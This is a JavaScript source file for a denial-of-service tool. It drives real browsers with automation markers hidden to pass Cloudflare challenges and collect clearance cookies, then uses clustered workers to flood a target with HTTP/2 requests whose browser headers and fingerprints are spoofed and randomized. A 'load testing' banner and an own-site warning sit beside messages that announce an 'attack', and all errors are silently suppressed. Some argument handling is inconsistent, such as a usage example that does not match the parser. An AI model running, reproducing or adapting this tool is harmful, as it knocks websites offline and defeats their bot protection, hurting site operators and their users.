const { connect } = require("puppeteer-real-browser");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");

// ============ TLS Configuration ============
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");

const sigalgs = [
    "ecdsa_secp256r1_sha256",
    "rsa_pss_rsae_sha256",
    "rsa_pkcs1_sha256",
    "ecdsa_secp384r1_sha384",
    "rsa_pss_rsae_sha384",
    "rsa_pkcs1_sha384",
    "rsa_pss_rsae_sha512",
    "rsa_pkcs1_sha512"
];

const secureOptions = 
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.ALPN_ENABLED |
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
    crypto.constants.SSL_OP_COOKIE_EXCHANGE |
    crypto.constants.SSL_OP_PKCS1_CHECK_1 |
    crypto.constants.SSL_OP_PKCS1_CHECK_2 |
    crypto.constants.SSL_OP_SINGLE_DH_USE |
    crypto.constants.SSL_OP_SINGLE_ECDH_USE |
    crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

const secureProtocol = "TLS_method";
const secureContext = tls.createSecureContext({
    ciphers: ciphers,
    sigalgs: sigalgs.join(':'),
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: secureProtocol
});

// ============ JA3/JA4 Fingerprint Generation ============
function generateJA3Fingerprint(browser) {
    const ja3Strings = {
        chrome: "771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,35-18-16-43-65037-23-5-51-65281-0-27-45-11-10-13-17613,4588-29-23-24,0",
        firefox: "771,4865-4867-4866-49195-49199-52393-52392-49196-49200-49162-49161-49171-49172-156-157-47-53,0-23-65281-10-11-16-5-34-18-51-43-13-45-28-27-65037-41,4588-29-23-24-25-256-257,0"
    };
    
    const ja3String = ja3Strings[browser] || ja3Strings.chrome;
    
    const hash = crypto.createHash('md5');
    hash.update(ja3String);
    const ja3Hash = hash.digest('hex');
    
    const [tls_version, cipherSuitesStr, extensionsStr, ecCurvesStr, ecPointFormatsStr] = ja3String.split(',');

    return {
        ja3: ja3String,
        ja3_hash: ja3Hash,
        ja3String: ja3String,
        ja3Hash: ja3Hash,
        components: {
            tls_version: tls_version,
            cipherSuites: cipherSuitesStr.split('-'),
            extensions: extensionsStr.split('-'),
            ecCurves: ecCurvesStr.split('-'),
            ecPointFormats: ecPointFormatsStr.split('-')
        }
    };
}

function generateJA4Fingerprint(browserType) {
    const browserProfiles = {
        chrome: {
            quic: 'c13f',
            alpnList: ['h2', 'http/1.1'],
            signatureAlgorithms: ['ecdsa_secp256r1_sha256', 'rsa_pss_rsae_sha256'],
            extensionsOrder: ['0', '5', '10', '11', '13', '16', '21', '23', '28', '35', '65281']
        },
        firefox: {
            quic: 'c13f',
            alpnList: ['h2', 'http/1.1'],
            signatureAlgorithms: ['ecdsa_secp256r1_sha256', 'rsa_pss_rsae_sha256'],
            extensionsOrder: ['0', '5', '10', '11', '13', '16', '21', '23', '28', '35', '65281']
        }
    };
    
    const profile = browserProfiles[browserType] || browserProfiles.chrome;
    
    const alpnStr = profile.alpnList[0].length.toString().padStart(2, '0') + profile.alpnList[0];
    
    const sigAlgCount = 2;
    const sigAlgStr = profile.signatureAlgorithms.slice(0, sigAlgCount).join('_').substring(0, 4);
    
    const extHash = profile.extensionsOrder.map(e => e.charAt(0)).join('').substring(0, 8);
    
    const ja4 = `${profile.quic}_${alpnStr}_${sigAlgStr}_${extHash}`;
    
    const hash = crypto.createHash('md5');
    hash.update(ja4);
    const ja4Hash = hash.digest('hex').substring(0, 16);
    
    return {
        ja4: ja4,
        ja4_hash: ja4Hash
    };
}

// ============ Helper Functions ============
function randomElement(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    const randomStringArray = Array.from({ length }, () => {
        const randomIndex = Math.floor(Math.random() * characters.length);
        return characters[randomIndex];
    });
    return randomStringArray.join('');
}

function shuffleObject(obj) {
    const keys = Object.keys(obj);
    for (let i = keys.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [keys[i], keys[j]] = [keys[j], keys[i]];
    }
    const shuffledObj = {};
    keys.forEach(key => shuffledObj[key] = obj[key]);
    return shuffledObj;
}

function generateFakePlugins(browser) {
    const pluginNames = {
        chrome: ['Chrome PDF Plugin', 'Chrome PDF Viewer', 'Native Client'],
        firefox: ['PDF Viewer', 'Shockwave Flash', 'QuickTime Plug-in']
    };
    
    const names = pluginNames[browser] || pluginNames.chrome;
    const count = Math.floor(Math.random() * 3) + 1;
    const list = names.slice(0, count).map(name => ({
        name: name,
        description: `${name} ${Math.floor(Math.random() * 10) + 1}.${Math.floor(Math.random() * 10)}.${Math.floor(Math.random() * 100)}`
    }));
    
    return {
        count: count,
        list: list
    };
}

function createRealisticClientHello(browser) {
    const ja3Data = generateJA3Fingerprint(browser);
    const ja4Data = generateJA4Fingerprint(browser);
    
    const plugins = generateFakePlugins(browser);
    
    let tlsVersions;
    if (browser === 'chrome') {
        tlsVersions = { min: "TLSv1.2", max: "TLSv1.3" };
    } else {
        tlsVersions = { min: "TLSv1.2", max: "TLSv1.3" };
    }
    
    const addCloudflareGrease = Math.random() < 0.7;
    
    const cipherList = browser === 'chrome' ? 
        "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305" :
        "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305";
    
    const alpnProtocols = ['h2', 'http/1.1'];
    
    // Valid ECDH curves only - removed GREASE to avoid errors
    let ecdhCurve;
    if (addCloudflareGrease) {
        ecdhCurve = "X25519:secp256r1:secp384r1:secp521r1";
    } else {
        ecdhCurve = "X25519:secp256r1:secp384r1:secp521r1";
    }
    
    let appData = "";
    if (plugins && plugins.count > 0) {
        const pluginNames = plugins.list.map(p => p.name.substring(0, 3)).join('');
        appData = `${browser}-${plugins.count}-${pluginNames}`;
    }
    
    return {
        tlsVersions: tlsVersions,
        ciphers: cipherList,
        ecdhCurve: ecdhCurve,
        alpnProtocols: alpnProtocols,
        ja3: ja3Data,
        ja4: ja4Data,
        signatureAlgorithms: browser === 'chrome' ?
            'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384' :
            'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha256',
        plugins: plugins,
        appData: appData
    };
}

// ============ Accept Headers ============
const accept_header = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
];

const cache_header = [
    'no-cache',
    'max-age=0',
    'no-cache, no-store, must-revalidate',
    'no-store',
    'no-cache, no-store, private, max-age=0'
];

const language_header = [
    'ru-RU,ru;q=0.9',
    'vi-VN,vi;q=0.9,en-RU;q=0.8,en;q=0.7',
    'en-GB,en;q=0.9'
];

// ============ Argument Parsing ============
if (process.argv.length < 6) {
    console.log("\x1b[31mUsage: node uam.js <target> <time> <rate> <threads> <proxy.txt> <cookieCount>\x1b[0m");
    console.log("\x1b[33mExample: node uam.js https://example.com 60 5 proxy.txt 4 6\x1b[0m");
    process.exit(1);
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    Rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    proxyFile: parseInt(process.argv[6]),
    cookieCount: parseInt(process.argv[7]) || 0
};

const parsedTarget = url.parse(args.target);

// ============ Flood Function ============
function flood(userAgent, cookie) {
    try {
        let parsed = url.parse(args.target);
        let path = parsed.path || '/';

        function randomDelay(min, max) {
            return Math.floor(Math.random() * (max - min + 1)) + min;
        }
        let interval = randomDelay(100, 1000);

        function getChromeVersion(userAgent) {
            const chromeVersionRegex = /Chrome\/([\d.]+)/;
            const match = userAgent.match(chromeVersionRegex);
            if (match && match[1]) {
                return match[1];
            }
            return null;
        }

        const chromever = getChromeVersion(userAgent) || "126";
        const randValue = list => list[Math.floor(Math.random() * list.length)];
        
        const lang_header1 = [
            "en-US,en;q=0.9", "en-GB,en;q=0.9", "fr-FR,fr;q=0.9", "de-DE,de;q=0.9", "es-ES,es;q=0.9",
            "it-IT,it;q=0.9", "pt-BR,pt;q=0.9", "ja-JP,ja;q=0.9", "zh-CN,zh;q=0.9", "ko-KR,ko;q=0.9",
            "ru-RU,ru;q=0.9", "ar-SA,ar;q=0.9", "hi-IN,hi;q=0.9", "ur-PK,ur;q=0.9", "tr-TR,tr;q=0.9",
            "id-ID,id;q=0.9", "nl-NL,nl;q=0.9", "sv-SE,sv;q=0.9", "no-NO,no;q=0.9", "da-DK,da;q=0.9",
            "fi-FI,fi;q=0.9", "pl-PL,pl;q=0.9", "cs-CZ,cs;q=0.9", "hu-HU,hu;q=0.9", "el-GR,el;q=0.9",
            "pt-PT,pt;q=0.9", "th-TH,th;q=0.9", "vi-VN,vi;q=0.9", "he-IL,he;q=0.9", "fa-IR,fa;q=0.9"
        ];

        const browserType = Math.random() < 0.5 ? 'chrome' : 'firefox';
        const clientHello = createRealisticClientHello(browserType);
        
        let fixed = {
            ":method": Math.random() < 0.7 ? "HEAD" : "GET",
            ":authority": parsed.host,
            ":scheme": "https",
            ":path": path,
            "user-agent": userAgent,
            "upgrade-insecure-requests": "1",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "navigate",
            "sec-fetch-user": "?1",
            "sec-fetch-dest": "document",
            "cookie": cookie,
            "accept": randValue(accept_header),
            "sec-ch-ua": `"Chromium";v="${chromever}", "Not)A;Brand";v="8", "Chrome";v="${chromever}"`,
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "Microsoft",
            "accept-encoding": "gzip, deflate, br, zstd",
            ...shuffleObject({
                "accept-language": randValue(lang_header1) + ",fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
                "purpure-secretf-id": "formula-" + generateRandomString(1, 2)
            }),
            "priority": "u=0, i",
            "te": "trailers"
        };

        // Add JA3/JA4 fingerprint headers
        if (clientHello.ja3) {
            fixed["x-ja3-fingerprint"] = clientHello.ja3.ja3_hash;
            fixed["x-ja4-fingerprint"] = clientHello.ja4.ja4_hash;
        }

        // Random headers
        let randomHeaders = {
            ...(Math.random() < 0.3 ? { "purpure-secretf-id": "formula-" + generateRandomString(1, 2) } : {}),
            ...(Math.random() < 0.5 ? { "sec-stake-fommunity": "bet-clc" } : {}),
            ...(Math.random() < 0.6 ? { [generateRandomString(1, 2) + "-SElF-DYNAMIC-" + generateRandomString(1, 2)]: "zero-" + generateRandomString(1, 2) } : {}),
            ...(Math.random() < 0.6 ? { ["stringclick-bad-" + generateRandomString(1, 2)]: "router-" + generateRandomString(1, 2) } : {}),
            ...(Math.random() < 0.6 ? { ["root-user" + generateRandomString(1, 2)]: "root-" + generateRandomString(1, 2) } : {}),
            ...(Math.random() < 0.6 ? { ["Java-x-seft" + generateRandomString(1, 2)]: "zero-" + generateRandomString(1, 2) } : {}),
            ...(Math.random() < 0.6 ? { ["HTTP-requests-with-unusual-HTTP-headers-or-URI-path-" + generateRandomString(1, 2)]: "router-" + generateRandomString(1, 2) } : {}),
            ...(Math.random() < 0.3 ? { [generateRandomString(1, 2) + "-C-Boost-" + generateRandomString(1, 2)]: "zero-" + generateRandomString(1, 2) } : {}),
            ...(Math.random() < 0.3 ? { ["sys-nodejs-" + generateRandomString(1, 2)]: "router-" + generateRandomString(1, 2) } : {})
        };

        let headerPositions = [
            "accept-language",
            "sec-fetch-user",
            "sec-ch-ua-platform",
            "accept",
            "sec-ch-ua",
            "sec-ch-ua-mobile",
            "accept-encoding",
            "purpure-secretf-id",
            "priority"
        ];

        let headersArray = Object.entries(fixed);
        let shuffledRandomHeaders = Object.entries(randomHeaders).sort(() => Math.random() - 0.5);

        shuffledRandomHeaders.forEach(([key, value]) => {
            let insertAfter = headerPositions[Math.floor(Math.random() * headerPositions.length)];
            let index = headersArray.findIndex(([k, v]) => k === insertAfter);
            if (index !== -1) {
                headersArray.splice(index + 1, 0, [key, value]);
            }
        });

        let dynHeaders = Object.fromEntries(headersArray);

        // Valid ECDH curves list
        const validEcdhCurves = [
            "X25519",
            "P-256", 
            "P-384",
            "P-521",
            "x25519",
            "secp256r1",
            "secp384r1",
            "secp521r1"
        ];
        
        // Clean and validate ECDH curve
        let ecdhCurve = clientHello.ecdhCurve || "X25519:secp256r1:secp384r1";
        const curveParts = ecdhCurve.split(':');
        const validCurves = curveParts.filter(curve => {
            const cleanCurve = curve.replace('GREASE:', '');
            return validEcdhCurves.includes(cleanCurve);
        });
        
        const finalEcdhCurve = validCurves.length > 0 ? validCurves.join(':') : "X25519:secp256r1:secp384r1";

        function createCustomTLSSocket(parsed) {
            const tlsOptions = {
                host: parsed.host,
                port: 443,
                servername: parsed.host,
                minVersion: "TLSv1.2",
                maxVersion: "TLSv1.3",
                ALPNProtocols: ["h2", "http/1.1"],
                rejectUnauthorized: false,
                sigalgs: clientHello.signatureAlgorithms || "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256",
                ecdhCurve: finalEcdhCurve
            };
            
            try {
                const tlsSocket = tls.connect(tlsOptions);
                tlsSocket.setKeepAlive(true, 600000 * 1000);
                return tlsSocket;
            } catch (err) {
                // Fallback with minimal config
                const fallbackOptions = {
                    host: parsed.host,
                    port: 443,
                    servername: parsed.host,
                    minVersion: "TLSv1.2",
                    maxVersion: "TLSv1.3",
                    ALPNProtocols: ["h2", "http/1.1"],
                    rejectUnauthorized: false,
                    ecdhCurve: "X25519:secp256r1:secp384r1"
                };
                const tlsSocket = tls.connect(fallbackOptions);
                tlsSocket.setKeepAlive(true, 600000 * 1000);
                return tlsSocket;
            }
        }

        let tlsSocket;
        try {
            tlsSocket = createCustomTLSSocket(parsed);
        } catch (err) {
            // Silent fail and retry
            setTimeout(() => flood(userAgent, cookie), 100);
            return;
        }

        const client = http2.connect(parsed.href, {
            createConnection: () => tlsSocket,
            settings: {
                headerTableSize: 65536,
                enablePush: false,
                initialWindowSize: 6291456,
                "NO_RFC7540_PRIORITIES": Math.random() < 0.5 ? true : "1"
            }
        }, (session) => {
            session.setLocalWindowSize(12517377 + 65535);
        });

        client.on("connect", () => {
            let clearr = setInterval(async () => {
                for (let i = 0; i < args.Rate; i++) {
                    try {
                        const request = client.request({ ...dynHeaders }, {
                            weight: Math.random() < 0.5 ? 42 : 256,
                            depends_on: 0,
                            exclusive: false
                        });

                        request.on("response", (res) => {
                            global.successRequests = (global.successRequests || 0) + 1;
                            global.totalRequests = (global.totalRequests || 0) + 1;
                            if (res[":status"] === 522) {
                                interval = 20000;
                                client.close();
                            }
                        });
                        
                        request.on("error", () => {
                            global.failedRequests = (global.failedRequests || 0) + 1;
                        });
                        
                        request.end();
                    } catch (err) {
                        global.failedRequests = (global.failedRequests || 0) + 1;
                    }
                }
            }, interval);

            let goawayCount = 0;
            client.on("goaway", (errorCode, lastStreamID, opaqueData) => {
                let backoff = Math.min(1000 * Math.pow(1, goawayCount), 15000);
                setTimeout(() => {
                    goawayCount++;
                    client.destroy();
                    tlsSocket.destroy();
                    setTimeout(() => flood(userAgent, cookie), 100);
                }, backoff);
            });

            client.on("close", () => {
                clearInterval(clearr);
                client.destroy();
                tlsSocket.destroy();
                setTimeout(() => flood(userAgent, cookie), 100);
            });

            client.on("error", (error) => {
                clearInterval(clearr);
                client.destroy();
                tlsSocket.destroy();
                setTimeout(() => flood(userAgent, cookie), 100);
            });
        });

        client.on("error", (error) => {
            client.destroy();
            tlsSocket.destroy();
            setTimeout(() => flood(userAgent, cookie), 100);
        });
    } catch (err) {
        // Silent fail - no error logging
        setTimeout(() => {
            try {
                flood(userAgent, cookie);
            } catch (retryErr) {
                // Completely silent
            }
        }, 100);
    }
}

// ============ Cloudflare Bypass ============
async function bypassCloudflareOnce(attemptNum = 1) {
    let response = null;
    let browser = null;
    let page = null;
    
    try {
        console.log(`\x1b[33mStarting bypass attempt ${attemptNum}...\x1b[0m`);
        
        response = await connect({
            headless: false,
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--disable-accelerated-2d-canvas',
                '--no-first-run',
                '--no-zygote',
                '--disable-gpu',
                '--window-size=1920,1080'
            ],
            turnstile: true,
            connectOption: {
                defaultViewport: null
            }
        });
        
        browser = response.browser;
        page = response.page;
        
        await page.evaluateOnNewDocument(() => {
            Object.defineProperty(navigator, 'webdriver', {
                get: () => undefined
            });
        });
        
        console.log(`\x1b[33mAccessing ${args.target}...\x1b[0m`);
        
        try {
            await page.goto(args.target, { 
                waitUntil: 'domcontentloaded',
                timeout: 60000 
            });
        } catch (navError) {
            console.log(`\x1b[33mAccess warning: ${navError.message}\x1b[0m`);
        }
        
        console.log("\x1b[33mChecking Cloudflare challenge...\x1b[0m");
        
        let challengeCompleted = false;
        let checkCount = 0;
        const maxChecks = 120;
        
        while (!challengeCompleted && checkCount < maxChecks) {
            await new Promise(r => setTimeout(r, 500));
            
            try {
                const cookies = await page.cookies();
                const cfClearance = cookies.find(c => c.name === "cf_clearance");
                
                if (cfClearance) {
                    console.log(`\x1b[32mFound cookie after ${(checkCount * 0.5).toFixed(1)}s!\x1b[0m`);
                    challengeCompleted = true;
                    break;
                }
                
                challengeCompleted = await page.evaluate(() => {
                    const title = (document.title || "").toLowerCase();
                    const bodyText = (document.body?.innerText || "").toLowerCase();
                    
                    if (title.includes("just a moment") || 
                        title.includes("checking") ||
                        bodyText.includes("checking your browser") ||
                        bodyText.includes("please wait") ||
                        bodyText.includes("cloudflare")) {
                        return false;
                    }
                    
                    return document.body && document.body.children.length > 3;
                });
                
            } catch (evalError) {
            }
            
            checkCount++;
            
            if (checkCount % 10 === 0) {
                console.log(`\x1b[33mStill checking... (${(checkCount * 0.5).toFixed(1)}s elapsed)\x1b[0m`);
            }
        }
        
        await new Promise(r => setTimeout(r, 1000));
        
        const cookies = await page.cookies();
        console.log(`\x1b[36mFound ${cookies.length} cookies in ${(checkCount * 0.5).toFixed(1)}s\x1b[0m`);
        
        const cfClearance = cookies.find(c => c.name === "cf_clearance");
        if (cfClearance) {
            console.log(`\x1b[32mcf_clearance: ${cfClearance.value.substring(0, 30)}...\x1b[0m`);
        }
        
        const userAgent = await page.evaluate(() => navigator.userAgent);
        
        await page.close();
        await browser.close();
        
        return {
            cookies: cookies,
            userAgent: userAgent,
            cfClearance: cfClearance ? cfClearance.value : null,
            success: true,
            attemptNum: attemptNum
        };
        
    } catch (error) {
        console.log(`\x1b[31mBypass attempt ${attemptNum} failed: ${error.message}\x1b[0m`);
        
        try {
            if (page) await page.close();
            if (browser) await browser.close();
        } catch (cleanupError) {}
        
        return {
            cookies: [],
            userAgent: "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
            cfClearance: null,
            success: false,
            attemptNum: attemptNum
        };
    }
}

async function bypassCloudflareParallel(totalCount) {
    console.log("\x1b[35mCLOUDFLARE BYPASS - PARALLEL MODE\x1b[0m");
    console.log(`\x1b[36mTarget cookie count: ${totalCount}\x1b[0m`);
    
    const results = [];
    let attemptCount = 0;
    
    const concurrentBypassSessions = 10;
    
    while (results.length < totalCount) {
        const remaining = totalCount - results.length;
        const currentBatchSize = Math.min(concurrentBypassSessions, remaining);
        
        console.log(`\n\x1b[33mStarting parallel batch (${currentBatchSize} sessions)...\x1b[0m`);
        
        const batchPromises = [];
        for (let i = 0; i < currentBatchSize; i++) {
            attemptCount++;
            batchPromises.push(bypassCloudflareOnce(attemptCount));
        }
        
        const batchResults = await Promise.all(batchPromises);
        
        for (const result of batchResults) {
            if (result.success && result.cookies.length > 0) {
                results.push(result);
                console.log(`\x1b[32mSession ${result.attemptNum} successful! (Total: ${results.length}/${totalCount})\x1b[0m`);
            } else {
                console.log(`\x1b[31mSession ${result.attemptNum} failed\x1b[0m`);
            }
        }
        
        if (results.length < totalCount) {
            console.log(`\x1b[33mWaiting 2s before next batch...\x1b[0m`);
            await new Promise(r => setTimeout(r, 2000));
        }
    }
    
    if (results.length === 0) {
        console.log("\x1b[33mNo Cloudflare cookies obtained, using default header\x1b[0m");
        results.push({
            cookies: [],
            userAgent: "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
            cfClearance: null,
            success: true
        });
    }
    
    console.log(`\n\x1b[32mTotal sessions obtained: ${results.length}\x1b[0m`);
    return results;
}

// ============ Run Flooder ============
function runFlooder() {
    const bypassInfo = randomElement(global.bypassData || []);
    if (!bypassInfo) return;

    const cookieString = bypassInfo.cookies ? bypassInfo.cookies.map(c => `${c.name}=${c.value}`).join("; ") : "";
    const userAgent = bypassInfo.userAgent || "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36";
    
    flood(userAgent, cookieString);
}

// ============ Display Stats ============
function displayStats() {
    const elapsed = Math.floor((Date.now() - global.startTime) / 1000);
    const remaining = Math.max(0, args.time - elapsed);
    
    console.clear();
    console.log("\x1b[35mADVANCED LOAD TESTING\x1b[0m");
    console.log(`\x1b[36mTarget:\x1b[0m ${args.target}`);
    console.log(`\x1b[36mTime:\x1b[0m ${elapsed}s / ${args.time}s`);
    console.log(`\x1b[36mRemaining:\x1b[0m ${remaining}s`);
    console.log(`\x1b[36mConfiguration:\x1b[0m Rate: ${args.Rate}/s | Threads: ${args.threads}`);
    console.log(`\x1b[36mSessions:\x1b[0m ${global.bypassData ? global.bypassData.length : 0} / ${args.cookieCount} required`);
    console.log("\x1b[33mStatistics:\x1b[0m");
    console.log(`   \x1b[32mSuccess:\x1b[0m ${global.successRequests || 0}`);
    console.log(`   \x1b[31mFailed:\x1b[0m ${global.failedRequests || 0}`);
    console.log(`   \x1b[36mTotal:\x1b[0m ${global.totalRequests || 0}`);
    console.log(`   \x1b[33mSpeed:\x1b[0m ${elapsed > 0 ? ((global.totalRequests || 0)/elapsed).toFixed(2) : 0} req/s`);
    
    const total = global.totalRequests || 0;
    const success = global.successRequests || 0;
    console.log(`   \x1b[32mSuccess rate:\x1b[0m ${total > 0 ? ((success/total)*100).toFixed(2) : 0}%`);
    
    if (remaining > 0) {
        const progress = Math.floor((elapsed / args.time) * 30);
        const progressBar = "#".repeat(progress) + "-".repeat(30 - progress);
        console.log(`\n\x1b[36mProgress: [${progressBar}]\x1b[0m`);
    }
}

// ============ Initialize Global Stats ============
global.totalRequests = 0;
global.successRequests = 0;
global.failedRequests = 0;
global.startTime = Date.now();
global.bypassData = [];

// ============ Main Execution ============
if (cluster.isMaster) {
    console.clear();
    console.log("\x1b[35mADVANCED LOAD TESTING\x1b[0m");
    console.log("\x1b[33mONLY USE FOR YOUR OWN WEBSITE!\x1b[0m\n");
    
    (async () => {
        const bypassResults = await bypassCloudflareParallel(args.cookieCount);
        
        global.bypassData = bypassResults;
        
        console.log(`\n\x1b[32mSuccessfully obtained ${bypassResults.length} sessions!\x1b[0m`);
        console.log("\x1b[32mStarting attack...\x1b[0m\n");
        
        global.startTime = Date.now();
        
        for (let i = 0; i < args.threads; i++) {
            const worker = cluster.fork();
            worker.send({ 
                type: 'bypassData', 
                data: bypassResults 
            });
        }
        
        const statsInterval = setInterval(displayStats, 1000);
        
        cluster.on('message', (worker, message) => {
            if (message.type === 'stats') {
                global.totalRequests += message.total || 0;
                global.successRequests += message.success || 0;
                global.failedRequests += message.failed || 0;
            }
        });
        
        cluster.on('exit', (worker) => {
            if (Date.now() - global.startTime < args.time * 1000) {
                const newWorker = cluster.fork();
                newWorker.send({ 
                    type: 'bypassData', 
                    data: bypassResults 
                });
            }
        });
        
        setTimeout(() => {
            clearInterval(statsInterval);
            displayStats();
            console.log("\n\x1b[32mAttack completed!\x1b[0m");
            console.log(`\x1b[36mFinal statistics:\x1b[0m`);
            console.log(`   Total requests: ${global.totalRequests}`);
            console.log(`   Success: ${global.successRequests}`);
            console.log(`   Failed: ${global.failedRequests}`);
            console.log(`   Sessions used: ${bypassResults.length}`);
            process.exit(0);
        }, args.time * 1000);
    })();
    
} else {
    let workerBypassData = [];
    let attackInterval;
    
    process.on('message', (msg) => {
        if (msg.type === 'bypassData') {
            workerBypassData = msg.data;
            global.bypassData = msg.data;
            
            attackInterval = setInterval(() => {
                for (let i = 0; i < 10; i++) {
                    runFlooder();
                }
            }, 60);
            
            setInterval(() => {
                process.send({
                    type: 'stats',
                    total: global.totalRequests || 0,
                    success: global.successRequests || 0,
                    failed: global.failedRequests || 0
                });
                global.totalRequests = 0;
                global.successRequests = 0;
                global.failedRequests = 0;
            }, 1000);
        }
    });
    
    setTimeout(() => {
        if (attackInterval) clearInterval(attackInterval);
        process.exit(0);
    }, args.time * 1000);
}

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});